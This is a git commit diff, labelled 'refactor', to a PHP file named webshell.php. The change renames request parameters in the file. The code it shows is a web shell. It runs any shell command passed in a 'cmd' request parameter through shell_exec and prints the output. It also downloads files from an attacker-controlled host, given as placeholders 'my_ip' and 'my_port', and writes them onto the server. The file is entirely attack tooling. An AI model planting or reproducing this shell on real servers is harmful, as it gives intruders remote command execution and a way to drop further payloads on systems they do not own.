fe0457d037804aba955783bf71c95f45a5660b58
Richard Curteis <richardcurteis@users.noreply.github.com>
2019-05-23 13:45:21 +0100

    refactor

--- webshell.php
+++ webshell.php
@@ -1,10 +1,10 @@
 <?php
 	$host = "my_ip";
 	$port = "my_port"
-	if (isset($_REQUEST['myUpload'])) {
-		file_put_contents($_REQUEST['myUpload'], file_get_contents("http://$host:$port/" . $_REQUEST['myUpload']));
+	if (isset($_REQUEST['upload'])) {
+		file_put_contents($_REQUEST['upload'], file_get_contents("http://$host:$port/" . $_REQUEST['upload']));
 	};
-	if (isset($_REQUEST['myCmd'])) {
-		echo "<pre>" . shell_exec($_REQUEST['myCmd']) . "</pre>";
+	if (isset($_REQUEST['cmd'])) {
+		echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
 	};
 ?>
